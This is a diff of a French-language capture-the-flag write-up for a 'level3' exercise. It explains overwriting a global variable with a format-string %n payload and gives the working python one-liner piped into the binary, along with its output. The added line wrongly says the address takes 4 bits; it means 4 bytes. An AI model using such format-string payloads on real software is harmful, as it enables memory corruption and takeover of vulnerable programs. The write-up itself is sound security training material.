@@ -32,6 +32,7 @@ Une fois print le programme compare une variable global avec la valeur 64, si 64
 	0x0804988c  m
 
 Le principe est de récrire le contenu de la variable avec le nombre que l'on souhaite pour cela on vas utiliser %n
+Je met l'addresse de la variable m (elle prend 4 bits) et j'en rajoute 60 (64) puis j'inscrit dans l'addresse mis au debut le nombre d'élement écrit plus tot.
 
 	cat <( python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"') - | ./level3
 	�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
